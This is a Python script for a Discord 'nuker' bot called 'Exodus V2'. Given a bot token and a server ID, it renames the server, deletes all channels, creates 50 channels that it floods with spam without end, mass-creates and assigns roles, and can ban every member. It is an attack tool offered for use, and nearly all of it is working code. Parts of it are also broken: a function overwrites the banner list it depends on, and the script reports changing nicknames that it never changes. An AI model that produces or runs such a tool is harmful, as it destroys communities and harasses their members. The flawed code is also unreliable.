import os
import asyncio
import discord
from discord.ext import commands
from colorama import Fore, Style
import time

###################################
# written in py by qxvz on github
# github.com/qxvz              
###################################

os.system("title Exodus V2")

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def rgb(start_color, end_color, steps):
    fade_colors = []
    for i in range(steps):
        factor = i / (steps - 1)
        fade_color = (
            int(start_color[0] + (end_color[0] - start_color[0]) * factor),
            int(start_color[1] + (end_color[1] - start_color[1]) * factor),
            int(start_color[2] + (end_color[2] - start_color[2]) * factor),
        )
        fade_colors.append(f"\033[38;2;{fade_color[0]};{fade_color[1]};{fade_color[2]}m")
    return fade_colors

def rgbfade(text, start_color, end_color):
    fade_colors = rgb(start_color, end_color, len(text))
    faded_text = "".join(f"{fade_colors[i]}{text[i]}" for i in range(len(text)))
    print(f"{faded_text}{Style.RESET_ALL}")

ascii = [
    r"⣤⣤⣤⣀⣀⣀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⡛⠟⢟⡉⠉⢉⣽⣩⡿⠻⢿⢅⡀⠀⣀⠐⠀⠀⠻⣿⡶⠂",
    r"⠉⠉⠉⠉⠉⠛⠛⠛⠛⠛⠻⠿⠿⠿⠿⢿⣿⣶⣿⣷⣯⣷⣶⣿⣿⣿⣯⢥⠀⠂⣅⠠⢱⠀⠁⢇⠐⡒⠀⠻⣧⠀⠀⠀",
    r"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣌⡑⠊⠀⢀⠙⠆⠀⠠⠀⠍⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀",
    r"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠉⣉⢹⡷⣤⣴⣾⣧⣾⣿⣷⣤⣄⣀⣠⣄⢤⣤⣤⣄⠀⠀⠀",
    r"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⠖⣲⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⢛⢛⠟⢫⣟⣿⣷⣛⣻⣏⣾⡿⢟⠿⠋⣩⣿⣿⣿⣿⡿⠟⣿⡇⠀⠀",
    r"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣾⣿⣿⣿⣷⣿⡿⠛⠿⠿⢿⡿⠷⣬⣿⠟⠉⠀⠁⠀⣸⣷⣾⡿⢞⠻⢟⣉⣀⣀⠱⠆⠀⠂⣛⠿⣿⣿⣿⣿⣯⡉⠀⠀⠀",
    r"⠀⠀⢀⣤⡤⠤⠤⢤⣤⣶⣿⣿⣽⣿⣿⣿⢿⣛⣀⢀⠤⠤⠤⣠⣼⣞⣁⡤⢴⣲⠾⠟⣹⣟⣿⣟⡀⡠⠄⣄⣠⣤⣿⣿⣶⣶⣾⣿⣿⣿⣿⣯⣿⣿⣶⣶⠦",
    r"⠀⣠⠛⠀⠀⠀⢠⣾⣿⣿⣋⣿⣿⡟⣙⣻⣿⣃⣿⣿⡞⣷⣶⣿⠏⠀⠀⠀⠈⠀⣰⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢯⣿⡿⡿⢿⣻⣿⣧",
    r"⠐⠛⣳⣶⣶⣶⣿⣿⠿⠁⠀⠉⠛⠛⠛⠛⠛⠿⠻⠿⠿⠿⢿⣁⣀⣀⣀⣀⣀⣾⣿⣿⣯⣿⣿⣟⣿⣿⣿⣿⣿⣿⣿⣟⣿⣶⣿⡟⣿⣿⣿⣽⣿⣿⣷⣿⣿",
    r"⠀⠀⣿⣿⢿⣿⣿⣿⣿⣿⣿⣏⣛⣛⢻⡛⡗⣓⣒⣲⣱⡒⠶⢾⣿⣿⣿⣿⣿⣿⠿⣿⣿⣷⣾⣿⣿⣿⢿⡿⢿⣿⣿⣿⡟⢻⣿⣿⠍⣻⣟⢾⣼⣿⣿⣿⡿",
    r"⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣷⣿⣾⣷⣿⣿⣿⣿⣿⣿⣿⣿⢲⣿⣿⢹⡗⢸⣿⣿⢹⣧⣼⣿⣿⣿⣧⣾⣿⣿⣿⣿⢹⣾⣿⣿⣿⡟⠀",
    r"⠀⠀⠀⠈⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣸⣿⣼⣿⣼⣾⣿⣿⢿⣿⣧⡿⢻⣿⣧⣋⣡⣿⣿⣾⠿⠋⠀⠀",
    r"⠀⠀⠀⠀⠀⠀⠈⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢷⣜⣋⣽⣿⣿⣾⣴⣿⣿⠿⠿⠿⠛⠋⠋⠉⠉⠀⠀⠀⠀⠀⠀",
    r"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠈⠉⠁⠉⠉⠉⠉⠉⠉⠉⠙⠙⠿⠻⠿⠿⠿⠟⠛⠛⠋⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀",
    r"",
    r"",
]



def ascii():
    dark_grey_rgb = (128, 128, 128)
    light_grey_rgb = (255, 255, 255)
    total_lines = len(ascii)

    def colorchange(start_color, end_color, factor):
        return tuple(
            int(start_val + (end_val - start_val) * factor)
            for start_val, end_val in zip(start_color, end_color)
        )

    for i, line in enumerate(ascii):
        factor = i / (total_lines - 1)
        current_color = colorchange(dark_grey_rgb, light_grey_rgb, factor)
        color_code = f"\033[38;2;{current_color[0]};{current_color[1]};{current_color[2]}m"
        print(f"{color_code}{line}")
        time.sleep(0.1)

def main():
    ascii()
    print("")
    token = input(" [?] - Bot Token ").strip()
    targetserver = input(" [?] - Target Server ID ").strip()
    spammsg = input(" [?] - Message ").strip()
    channelname = input(" [?] - Channel name ").strip()
    servername = input(" [?] - New Server name ").strip()
    spamroles = input(" [?] - Spam roles to members Y/N ").strip().lower() == "y"
    rolename = None
    if spamroles:
        rolename = input(" [?] - Role name ").strip()
    ban = input(" [?] - Ban all members Y/N ").strip().lower() == "y"

    if not all([token, spammsg, channelname, servername]) or (spamroles and not rolename):
        print(" [{Fore.RED}*{Fore.RESET}] All required prompts need to be filled")
        return

    asyncio.run(startbot(
        token, spammsg, channelname, servername, targetserver, spamroles, rolename, ban
    ))

async def startbot(token, spammsg, channelname, servername, targetserver, spamroles, rolename, ban):
    intents = discord.Intents.all()
    bot = commands.Bot(command_prefix="!", intents=intents)
    bot.remove_command('help')

    rate_limit_delay = 0.0

    @bot.event
    async def on_ready():
        clear()
        print(f"\n Bot {bot.user} is online and ready!\n")
        tasks = [
            mainnuke(guild)
            for guild in bot.guilds
            if not targetserver or str(guild.id) == targetserver
        ]
        await asyncio.gather(*tasks)
        print("\n Completed.")

        while True:
            try:
                await loopspam(bot, spammsg)
            except asyncio.CancelledError:
                break

    async def mainnuke(guild):
        print(f" [{Fore.GREEN}*{Fore.RESET}] Nuking server: {guild.name} ({guild.id})")

        try:
            await guild.edit(name=servername)
            print(f" [{Fore.GREEN}*{Fore.RESET}] Renamed server to '{servername}'")
        except Exception as e:
            print(f" [{Fore.RED}*{Fore.RESET}] Failed to rename server: {e}")

        tasks = [channel.delete() for channel in guild.channels]
        await asyncio.gather(*tasks, return_exceptions=True)
        print(f" [{Fore.GREEN}*{Fore.RESET}] Deleted all channels")

        tasks = [guild.create_text_channel(channelname) for _ in range(50)]
        new_channels = await asyncio.gather(*tasks, return_exceptions=True)
        for channel in new_channels:
            if isinstance(channel, discord.TextChannel):
                asyncio.create_task(channelspam(channel, spammsg))

        if spamroles:
            tasks = [guild.create_role(name=rolename) for _ in range(250 - len(guild.roles))]
            roles = await asyncio.gather(*tasks, return_exceptions=True)
            roles = [role for role in roles if isinstance(role, discord.Role)]
            tasks = [giveroles(guild, role) for role in roles]
            await asyncio.gather(*tasks, return_exceptions=True)
            print(f" [{Fore.GREEN}*{Fore.RESET}] Created and assigned roles")

        if ban:
            tasks = [member.ban(reason="Nuked") for member in guild.members]
            await asyncio.gather(*tasks, return_exceptions=True)
            print(f" [{Fore.GREEN}*{Fore.RESET}] Banned all members")

        await asyncio.gather(*tasks, return_exceptions=True)
        print(f" [{Fore.GREEN}*{Fore.RESET}] Changed nicknames for all members")

    async def channelspam(channel, spammsg):
        nonlocal rate_limit_delay
        while True:
            try:
                await channel.send(spammsg)
                print(f" [{Fore.GREEN}*{Fore.RESET}] 200 SUCCESS: SENT {channelname} > {servername}")
                await asyncio.sleep(rate_limit_delay)
            except discord.errors.HTTPException as e:
                if "rate limited" in str(e).lower():
                    rate_limit_delay = max(1.0, rate_limit_delay + 1.0)
                else:
                    print(f" [{Fore.RED}*{Fore.RESET}] Failed to send message in {channel.name}: {e}")
                    break

    async def loopspam(bot, spammsg):
        tasks = []
        for guild in bot.guilds:
            for channel in guild.text_channels:
                tasks.append(channelspam(channel, spammsg))
            if spamroles:
                for role in guild.roles:
                    tasks.append(spamrole(guild, role))
        await asyncio.gather(*tasks, return_exceptions=True)

    async def spamrole(guild, role):
        nonlocal rate_limit_delay
        for member in guild.members:
            if member.top_role < guild.me.top_role and member != guild.owner:
                try:
                    await member.add_roles(role)
                    print(f" [{Fore.GREEN}*{Fore.RESET}] Assigned role {role.name} to {member.name}")
                    await asyncio.sleep(rate_limit_delay)
                except discord.errors.HTTPException as e:
                    if "rate limited" in str(e).lower():
                        rate_limit_delay = max(1.0, rate_limit_delay + 1.0)
                        break
                    else:
                        print(f" [{Fore.RED}*{Fore.RESET}] Failed to assign role to {member.name}: {e}")

    async def giveroles(guild, role):
        tasks = [
            member.add_roles(role)
            for member in guild.members
            if member.top_role < guild.me.top_role and member != guild.owner
        ]
        await asyncio.gather(*tasks, return_exceptions=True)

    try:
        await bot.start(token)
    except Exception as e:
        print(f" [{Fore.RED}*{Fore.RESET}] Error starting bot: {e}")

if __name__ == "__main__":
    main()
